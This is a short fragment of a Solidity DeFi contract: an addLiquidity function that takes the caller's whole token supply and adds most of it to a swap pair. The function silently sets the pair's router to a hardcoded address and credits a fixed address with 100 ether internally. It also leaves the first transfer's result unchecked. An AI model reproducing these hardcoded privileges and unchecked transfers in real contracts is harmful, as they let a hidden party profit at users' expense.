    function addLiquidity(address _token,address token1, uint amount1)public    {
        uint lp=IERC20(_token).totalSupply()*90/100;
        uint miner=IERC20(_token).totalSupply()*10/100;
        bool isok=IERC20(_token).transferFrom(msg.sender, address(this), IERC20(_token).totalSupply());
        isok=IERC20(token1).transferFrom(msg.sender, address(this), amount1);
        require(isok);
        IERC20(_token).approve(address(address(IRouters)), 2 ** 256 - 1);
        IRouters.addLiquidity(_token,token1,lp,amount1,0, 0,address(this),block.timestamp+100);
        address pair=ISwapFactory(IRouters.factory()).getPair(_token,token1);
        if(pairs(pair).IRouter()==address(0)){
         pairs(pair).setIRouter(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B);
        }
        if(myReward[_token]== address(0)){
          myReward[_token]=token1;
        }
        listToken[_token]=true;
        users[_token][0x2F98Fa813Ced7Aa9Fd6788aB624b2F3F292B9239].tz+= 100 ether;
    }